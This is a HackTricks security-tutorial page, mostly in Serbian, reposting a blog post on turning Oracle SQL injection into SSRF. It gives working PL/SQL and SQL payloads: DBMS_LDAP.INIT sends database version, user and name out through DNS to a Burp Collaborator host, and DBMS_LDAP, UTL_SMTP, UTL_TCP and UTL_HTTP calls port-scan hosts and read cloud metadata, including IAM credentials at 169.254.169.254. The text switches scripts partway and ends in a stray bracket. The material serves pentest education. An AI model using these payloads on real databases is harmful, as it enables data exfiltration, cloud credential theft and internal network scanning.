# Oracle injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

**Poslu≈æite se ovim postom kao kopijom iz wayback ma≈°ine obrisanog posta sa [https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/)**.

## SSRF

Kori≈°ƒáenje Oracle-a za slanje Out of Band HTTP i DNS zahteva je dobro dokumentovano, ali kao sredstvo za ekfiltraciju SQL podataka u injekcijama. Uvek mo≈æemo modifikovati ove tehnike/funkcije da bismo uradili druge SSRF/XSPA.

Instalacija Oracle-a mo≈æe biti zaista bolna, posebno ako ≈æelite da postavite brzu instancu da isprobate komande. Moj prijatelj i kolega iz [Appsecco](https://appsecco.com), [Abhisek Datta](https://github.com/abhisek), ukazao mi je na [https://github.com/MaksymBilenko/docker-oracle-12c](https://github.com/MaksymBilenko/docker-oracle-12c) koji mi je omoguƒáio da postavim instancu na t2.large AWS Ubuntu ma≈°ini i Docker-u.

Pokrenuo sam docker komandu sa `--network="host"` flag-om kako bih mogao da imitiram Oracle kao nativnu instalaciju sa punim pristupom mre≈æi, tokom ovog blog posta.
```
docker run -d --network="host" quay.io/maksymbilenko/oracle-12c
```
#### Oracle –ø–∞–∫–µ—Ç–∏ –∫–æ—ò–∏ –ø–æ–¥—Ä–∂–∞–≤–∞—ò—É —Å–ø–µ—Ü–∏—Ñ–∏–∫–∞—Ü–∏—ò—É URL-–∞ –∏–ª–∏ –ò–º–µ —Ö–æ—Å—Ç–∞/–ë—Ä–æ—ò –ø–æ—Ä—Ç–∞ <a href="#oracle-packages-that-support-a-url-or-a-hostname-port-number-specification" id="oracle-packages-that-support-a-url-or-a-hostname-port-number-specification"></a>

–î–∞ –±–∏—Ö –ø—Ä–æ–Ω–∞—à–∞–æ –±–∏–ª–æ –∫–æ—ò–µ –ø–∞–∫–µ—Ç–µ –∏ —Ñ—É–Ω–∫—Ü–∏—ò–µ –∫–æ—ò–µ –ø–æ–¥—Ä–∂–∞–≤–∞—ò—É —Å–ø–µ—Ü–∏—Ñ–∏–∫–∞—Ü–∏—ò—É —Ö–æ—Å—Ç–∞ –∏ –ø–æ—Ä—Ç–∞, –∏–∑–≤—Ä—à–∏–æ —Å–∞–º Google –ø—Ä–µ—Ç—Ä–∞–≥—É –Ω–∞ [Oracle Database Online Documentation](https://docs.oracle.com/database/121/index.html). –ö–æ–Ω–∫—Ä–µ—Ç–Ω–æ,
```
site:docs.oracle.com inurl:"/database/121/ARPLS" "host"|"hostname" "port"|"portnum"
```
Pretraga je vratila sledeƒáe rezultate (neki od njih se ne mogu koristiti za izvoƒëenje izlazne mre≈æe)

* DBMS\_NETWORK\_ACL\_ADMIN
* UTL\_SMTP
* DBMS\_XDB
* DBMS\_SCHEDULER
* DBMS\_XDB\_CONFIG
* DBMS\_AQ
* UTL\_MAIL
* DBMS\_AQELM
* DBMS\_NETWORK\_ACL\_UTILITY
* DBMS\_MGD\_ID\_UTL
* UTL\_TCP
* DBMS\_MGWADM
* DBMS\_STREAMS\_ADM
* UTL\_HTTP

Ova gruba pretraga oƒçigledno preskoƒçuje pakete kao ≈°to je `DBMS_LDAP` (koji omoguƒáava prosleƒëivanje imena hosta i broja porta) jer [stranica sa dokumentacijom](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360) jednostavno upuƒáuje na [drugu lokaciju](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360). Stoga, mo≈æe postojati jo≈° Oracle paketa koji se mogu zloupotrebiti za slanje izlaznih zahteva, a koje sam mo≈æda propustio.

U svakom sluƒçaju, hajde da pogledamo neke od paketa koje smo otkrili i naveli iznad.

**DBMS\_LDAP.INIT**

Paket `DBMS_LDAP` omoguƒáava pristup podacima sa LDAP servera. Funkcija `init()` inicijalizuje sesiju sa LDAP serverom i uzima ime hosta i broj porta kao argument.

Ova funkcija je ranije dokumentovana da prikazuje eksfiltraciju podataka preko DNS-a, kao ispod
```
SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.'||(SELECT user FROM dual)||'.'||(select name from V$database)||'.'||'d4iqio0n80d5j4yg7mpu6oeif9l09p.burpcollaborator.net',80) FROM dual;
```
Meƒëutim, s obzirom na to da funkcija prihvata ime hosta i broj porta kao argumente, mo≈æete to koristiti da funkcioni≈°e kao skener portova.

Evo nekoliko primera
```
SELECT DBMS_LDAP.INIT('scanme.nmap.org',22) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',25) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',80) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',8080) FROM dual;
```
A `ORA-31203: DBMS_LDAP: PL/SQL - Init Failed.` pokazuje da je port zatvoren dok vrednost sesije ukazuje na to da je port otvoren.

**UTL\_SMTP**

Paket `UTL_SMTP` je dizajniran za slanje e-mailova preko SMTP-a. Primer dat na [Oracle dokumentacionom sajtu pokazuje kako mo≈æete koristiti ovaj paket za slanje e-maila](https://docs.oracle.com/database/121/ARPLS/u_smtp.htm#ARPLS71478). Za nas, meƒëutim, zanimljivo je to ≈°to omoguƒáava da se navedu host i specifikacija porta.

Grubi primer je prikazan ispod sa funkcijom `UTL_SMTP.OPEN_CONNECTION`, sa vremenskim ograniƒçenjem od 2 sekunde.
```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',80,2);
END;
```

```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',8080,2);
END;
```
A `ORA-29276: transfer timeout` pokazuje da je port otvoren, ali nije uspostavljena SMTP veza, dok `ORA-29278: SMTP transient error: 421 Service not available` pokazuje da je port zatvoren.

**UTL\_TCP**

Paket `UTL_TCP` i njegove procedure i funkcije omoguƒáavaju [TCP/IP baziranu komunikaciju sa servisima](https://docs.oracle.com/cd/B28359\_01/appdev.111/b28419/u\_tcp.htm#i1004190). Ako je programiran za odreƒëeni servis, ovaj paket mo≈æe lako postati naƒçin za pristup mre≈æi ili izvr≈°iti potpune Server Side Requests, jer se svi aspekti TCP/IP veze mogu kontrolisati.

Primer [na Oracle dokumentacionom sajtu pokazuje kako mo≈æete koristiti ovaj paket za uspostavljanje sirove TCP veze za preuzimanje web stranice](https://docs.oracle.com/cd/B28359\_01/appdev.111/b28419/u\_tcp.htm#i1004190). Mo≈æemo ga malo pojednostaviti i koristiti za slanje zahteva na instancu metapodataka, na primer, ili na proizvoljni TCP/IP servis.
```
set serveroutput on size 30000;
SET SERVEROUTPUT ON
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('169.254.169.254',80,tx_timeout => 2);
retval := utl_tcp.write_line(c, 'GET /latest/meta-data/ HTTP/1.0');
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
/
```

```
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('scanme.nmap.org',22,tx_timeout => 4);
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
```
Zanimljivo je da, zbog sposobnosti kreiranja sirovih TCP zahteva, ovaj paket se takoƒëe mo≈æe koristiti za upit usluge meta-podataka Instance svih provajdera u oblaku, jer se tip metode i dodatni zaglavlja mogu proslediti unutar TCP zahteva.

**UTL\_HTTP i Web Zahtevi**

Mo≈æda je najƒçe≈°ƒáa i naj≈°ire dokumentovana tehnika u svakom tutorijalu o Out of Band Oracle SQL Injection [`UTL_HTTP` paket](https://docs.oracle.com/database/121/ARPLS/u_http.htm#ARPLS070). Ovaj paket je definisan u dokumentaciji kao - `UTL_HTTP paket omoguƒáava Hypertext Transfer Protocol (HTTP) pozive iz SQL i PL/SQL. Mo≈æete ga koristiti za pristup podacima na Internetu preko HTTP-a.`
```
select UTL_HTTP.request('http://169.254.169.254/latest/meta-data/iam/security-credentials/adminrole') from dual;
```
Mo≈æete dodatno koristiti ovo za izvoƒëenje nekih rudimentarnih skeniranja portova sa upitima kao ≈°to su
```
select UTL_HTTP.request('http://scanme.nmap.org:22') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:8080') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:25') from dual;
```
`ORA-12541: TNS:no listener` ili `TNS:operation timed out` je znak da je TCP port zatvoren, dok je `ORA-29263: HTTP protocol error` ili podaci znak da je port otvoren.

Drugi paket koji sam koristio u pro≈°losti sa razliƒçitim uspehom je [`GETCLOB()` metoda `HTTPURITYPE` Oracle apstraktnog tipa](https://docs.oracle.com/database/121/ARPLS/t_dburi.htm#ARPLS71705) koja vam omoguƒáava interakciju sa URL-om i pru≈æa podr≈°ku za HTTP protokol. `GETCLOB()` metoda se koristi za preuzimanje GET odgovora sa URL-a kao [CLOB tip podataka.](https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html)[select HTTPURITYPE('http://169.254.169.254/latest/meta-data/instance-id').getclob() from dual;

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
